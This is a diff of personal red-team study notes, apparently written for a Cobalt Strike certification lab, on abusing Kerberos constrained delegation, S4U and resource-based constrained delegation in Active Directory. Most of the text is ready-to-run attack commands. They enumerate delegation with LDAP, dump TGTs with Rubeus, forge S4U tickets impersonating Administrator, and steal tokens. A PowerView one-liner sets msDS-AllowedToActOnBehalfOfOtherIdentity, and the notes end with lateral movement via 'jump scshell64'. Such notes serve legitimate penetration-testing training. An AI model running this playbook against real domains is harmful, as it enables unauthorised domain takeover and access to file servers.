@@ -4,6 +4,9 @@ See [[15 Forest & Domain Trusts]] to understand Kerberos across different realms
 
 OPSEC NOTE:
 	`run klist` is great but bad opsec from my understanding
+
+IMPERSONATION NOTES
+	Administrator is always a good choice... especially if you want CIFS
 #### Terms
 Key Distribution Center
 	A database of all principals and their associated secrets (i.e. password hashes).
@@ -149,11 +152,13 @@ Abusing S4U
 ```powershell
 # Query to identify hosts with CONSTRAINED DELEGATION & Services vulnerable
 beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo # Annotate hosts and service
+	# make note of FULL spn, including PORT
 	# IF WE NEED TO CHANGE THE SERVICE, proceed to Service Name Substitution
 
 # Check if TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
 beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=[hostname]$)) --attributes userAccountControl 
 [Convert]::ToBoolean([UAC VALUE] -band 16777216) #True = PROTOCOL TRANSITION set
+	# if this doesnt work, i have another query in Discovery LDAP section you can try
 
 # Move laterally to vulnerable computer (See 10 Lateral Movement)
 beacon> make_token [DOMAIN\user] [password]  # examples
@@ -190,7 +195,8 @@ beacoon> ls \\[dc hostname]\c$ # example
 beacon> rev2self
 beacon> kill [PID]
 ```
-Attacking S4U without Protocol Transition Enabled
+
+Attacking S4U with Protocol Transition Disabled
 	The computer's TGT cannot be used to obtain a forwardable service ticket via S4U2self when protocol transition is not enabled.  The S4U2self will still return a ticket but the forwardable flag will not be set, so S4U2proxy fails.
 	Instead, the adversary must obtain a service ticket that a user has requested to gain access to the front-end service
 ```powershell
@@ -348,6 +354,7 @@ Requirements to abuse RBCD to gain access to any computer:
 NOTE: It's much easier to enumerate and abuse RBCD through a SOCKS proxy. 
 
 Abusing RBCD - can replace IPs with hostnames ;)
+#### Method 1 (SOCKS)
 ```powershell
 REQUIREMENTS SECTION
 # Enumerating ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
@@ -398,12 +405,13 @@ LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com, CN=LON-WKSTN-1,OU=Wor
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap
 
-# Perform S4U steps to impersonate anyone in domain (Assuming protocol transition)
+# Perform S4U steps to impersonate anyone in domain
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap
 
 # Inject captured service ticket (the 2nd one) into logon session 
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==
-beacon> steal_token [PID]  # Impersonate spawned process
+beacon> token-store steal [PID]  
+beacon> token-store use 0 # Impersonate spawned process
 
 # Abuse
 beacon> ls \\lon-fs-1\c$
@@ -416,8 +424,45 @@ beacon> kill [PID]
 PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
 PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
 ```
+#### Method 2 - PowerView
+This is pulled and a slightly modified version of An0nud4y's checklist. This is if we have local admin access to a domain joined computer. If we don't, see case 2 of [[An0nud4y CRTO Cheatsheet]]
+```powershell
+## Enumerate domain computers that we have access to modify
+beacon> powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-1330904164-3792538338-293942156-[\d]{4,10}" }     # REPLACE SID with Domain SID
+	# Annotate vulnerable host and write property
 
+# Identify computer SID
+beacon> powerpick Get-DomainComputer -Identity <hostname> -Properties objectSid
+	# Make note of computer SID
 
+# Set delegation attribute
+beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1330904164-3792538338-293942156-2101)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "enc-fs-1" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+	# Modify computer SID & identity (hostname)
+
+# Verify attribute was set (should look like bits...)
+beacon> powerpick Get-DomainComputer -Identity "enc-fs-1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# Get TGT of our domain joined computer
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+	# TGT
+	[record TGT here]
+
+# S4U to get TGS of target computer
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ENC-JMP-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1.contoso.enclave /ticket:[TGT] /nowrap
+	# TGS
+	[record TGS here]
+
+# Inject TGS into sacrificial session, impersonating any user
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.ENCLAVE /username:Administrator /password:FakePass /ticket:[]
+	# Annotate PID
+beacon> token-store steal 6112
+beacon> token-store use 0
+
+# Jump to vulnerable machine
+beacon> ls \\enc-fs-1.contoso.enclave\c$
+beacon> jump scshell64 enc-fs-1.contoso.enclave smb
+```
 
 ## Challenge
 
